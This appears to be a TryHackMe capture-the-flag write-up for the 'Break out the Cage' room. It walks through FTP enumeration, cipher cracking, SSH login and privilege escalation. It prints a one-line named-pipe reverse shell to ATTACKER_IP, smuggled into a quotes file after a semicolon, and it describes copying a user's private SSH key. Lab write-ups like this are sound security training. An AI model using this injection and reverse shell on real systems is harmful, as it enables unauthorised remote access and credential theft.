---
layout: post
title:  "Break out the Cage - TryHackMe writeup"
date:   2024-08-23 10:42:00 +0200
categories: tryhackme ctf writeup
---
{:refdef: style="text-align: center;"}
[![Challenge logo](/assets/breakoutthecage/0_title.jpeg)](/assets/breakoutthecage/0_title.jpeg){:target="_blank"}
{:refdef}

**CTF Name**: [Break out the Cage](https://tryhackme.com/r/room/breakoutthecage1){:target="_blank"}  
**Description**: Help Cage bring back his acting career and investigate the nefarious goings on of his agent!  
**Categories**: Linux, Web Application, Privilege Escalation  
**Difficulty**: Easy  

The usual scan (**nmap -v -A -p- TARGET_IP -oN initial_scan.txt**) on the target reveals that all ports are in an ignored state.
To exclude that the target has only closed ports, let's run the same scan adding the **-sS** option (for **SYN half open** scan).
Remember to run this command via **sudo**.

{:refdef: style="text-align: center;"}
[![Nmap scan](/assets/breakoutthecage/1_nmap.png)](/assets/breakoutthecage/1_nmap.png){:target="_blank"}
{:refdef}

Indeed, some ports are open. Before visiting the target address with a browser, let's try connecting via FTP. We can login as the **anonymous** user (of course, without any password) and we can download a file, **dad_tasks**.

{:refdef: style="text-align: center;"}
[![FTP access](/assets/breakoutthecage/2_dad_tasks.png)](/assets/breakoutthecage/2_dad_tasks.png){:target="_blank"}
{:refdef}

This file contains a long string that looks encrypted. Pasting this into **CyberChef** reveals that it is a **Base64** encrypted string. However, decoding it does not give us understandable text yet.

{:refdef: style="text-align: center;"}
[![Decoding the string with CyberChef](/assets/breakoutthecage/3_cyberchef_1.png)](/assets/breakoutthecage/3_cyberchef_1.png){:target="_blank"}
{:refdef}

It actually looks like a **Vigenère cipher**. We don't know the key, but it can be bruteforced easily.

{:refdef: style="text-align: center;"}
[![Cracking the second string](/assets/breakoutthecage/4_vigenere_crack.png)](/assets/breakoutthecage/4_vigenere_crack.png){:target="_blank"}
{:refdef}

There is an interesting information at the end of this decrypted text.
It looks like a password, and inserting it as an answer to the first question gives us a green light.

Let's visit the website now while also enumerating it with **gobuster**.
The links are actually not functioning, so the only visible page seems to be the home page.

{:refdef: style="text-align: center;"}
[![Visiting the website](/assets/breakoutthecage/5_website.png)](/assets/breakoutthecage/5_website.png){:target="_blank"}
{:refdef}

Inspecting the source code we learn that an **/images** directory exists, however, it does not contain anything interesting.
Going back to **gobuster**, some interesting directories have popped out.

{:refdef: style="text-align: center;"}
[![Gobuster](/assets/breakoutthecage/6_gobuster.png)](/assets/breakoutthecage/6_gobuster.png){:target="_blank"}
{:refdef}

**/html** is empty, **/scripts** seems like a storage for movie scripts, while **/contracts** is of no use.

However, from the home page, we now know that **Weston** is a potential username. And we have a password in our hands. Let's try SSHing into our target with these credentials. Once we're in, we notice that there is another user, **cage**.

{:refdef: style="text-align: center;"}
[![SSH](/assets/breakoutthecage/7_ssh.png)](/assets/breakoutthecage/7_ssh.png){:target="_blank"}
{:refdef}

Running **sudo -l** we learn that we are allowed to run a specific program with sudo, **/usr/bin/bees**. Inspecting the file, we learn that it just displays a funny message about bees. It is also not writable by us so we cannot modify it to our advantage.

After a while we are surprised by a **broadcast message** by the user **cage**. May this message be displayed by a **cronjob**?

{:refdef: style="text-align: center;"}
[![Broadcast by Cage](/assets/breakoutthecage/8_broadcast.png)](/assets/breakoutthecage/8_broadcast.png){:target="_blank"}
{:refdef}

Let's check by reading **/etc/crontab**... unfortunately, no cronjobs are ran by root.

{:refdef: style="text-align: center;"}
[![Crontab](/assets/breakoutthecage/9_crontab.png)](/assets/breakoutthecage/9_crontab.png){:target="_blank"}
{:refdef}

To view cronjobs ran by other users we need root privileges, which we don't have (yet). However, we know that there must a program ran by cage *somewhere*, so we can search for it with find:

{% highlight bash %}
find / -type f -user cage 2>/dev/null
{% endhighlight %}

Indeed, two interesting files are found.

{:refdef: style="text-align: center;"}
[![Cage files](/assets/breakoutthecage/10_cage_files.png)](/assets/breakoutthecage/10_cage_files.png){:target="_blank"}
{:refdef}

One of those is a **Python script** that chooses a random quote from the other file, **.files/.quotes**, and broadcasts it with **wall**.

{:refdef: style="text-align: center;"}
[![Python script and quotes](/assets/breakoutthecage/11_python_script.png)](/assets/breakoutthecage/11_python_script.png){:target="_blank"}
{:refdef}

As we belong in the group **cage** (this can be verified with the **id** command), we could edit the program itself to, or we could craft a malicious command and echo it into that **.quotes** file, so that it would be picked up by the script and ran. We're going with the latter option as it is quieter. In this case we will simply open a **reverse shell**. The command **wall** expects something, so let's give it a string to be broadcasted, followed by our malicious command:

{% highlight bash %}
echo "something;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f" > /opt/.dads_scripts/.files/.quotes
{% endhighlight %}

{:refdef: style="text-align: center;"}
[![Preparing the malicious command](/assets/breakoutthecage/12_malicious_command.png)](/assets/breakoutthecage/12_malicious_command.png){:target="_blank"}
{:refdef}

Don't forget to also run the listener on the attacking machine with **nc -lvnp PORT**. In a couple minutes we should have our reverse shell.

{:refdef: style="text-align: center;"}
[![Waiting for the connection](/assets/breakoutthecage/13_listener.png)](/assets/breakoutthecage/13_listener.png){:target="_blank"}
{:refdef}

After converting our shell into a **fully interactive shell**, we can find some interesting files in cage's home. Reading the **SuperDuperChecklist** reveals the first flag of this challenge, while reading the emails we notice that the third email contains an interesting string.

{:refdef: style="text-align: center;"}
[![Cage's home](/assets/breakoutthecage/14_cage_home.png)](/assets/breakoutthecage/14_cage_home.png){:target="_blank"}
{:refdef}

Reading **.ssh/id_rsa** we can also exfiltrate cage's **private SSH key** so that if we need to login again we can bypass the reverse shell and directly login as cage. Anyways, the interesting string may be an encrypted string once again. Going down the same route as the last encrypted text, we could try again with a **Vigenère cipher**... but what's the key?
The same site as before is not able to find an appropriate key (it does "decrypt" our string, but the resulting text does not make any sense).
The email contains several references to **cage's face** (and to the movie itself)... could **face** be the key?

{:refdef: style="text-align: center;"}
[![Another encrypted string](/assets/breakoutthecage/15_face.png)](/assets/breakoutthecage/15_face.png){:target="_blank"}
{:refdef}

Indeed, it looks like we got another interesting string. Perhaps it could be someone's password. Trying with **sudo** we find out that it is not cage's password.

{:refdef: style="text-align: center;"}
[![Whose is this password?](/assets/breakoutthecage/16_failed_attempt.png)](/assets/breakoutthecage/16_failed_attempt.png){:target="_blank"}
{:refdef}

We already know weston's password... there is only one user left, **root**! Let's try with **su**, input the password... and there we are, **root shell**! The only thing left to do is to read the **root flag**.

{:refdef: style="text-align: center;"}
[![Root shell and flag](/assets/breakoutthecage/17_root_shell.png)](/assets/breakoutthecage/17_root_shell.png){:target="_blank"}
{:refdef}